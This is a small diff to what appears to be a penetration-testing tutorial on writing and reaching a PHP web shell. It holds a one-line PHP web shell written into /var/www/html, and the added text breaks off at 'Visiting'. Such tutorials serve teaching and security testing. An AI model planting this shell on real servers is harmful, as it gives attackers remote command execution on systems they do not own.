@@ -216,4 +216,7 @@ We can check these directories to see which webroot is in use and then use `echo
 echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ```
 
-#### Step 3: Accessing the Web Shell
+#### Step 3: Accessing our Web Shell
+Once we've written and uploaded the web shell, we can access it either through the browser or using `cURL`:
+
+*Visiting *
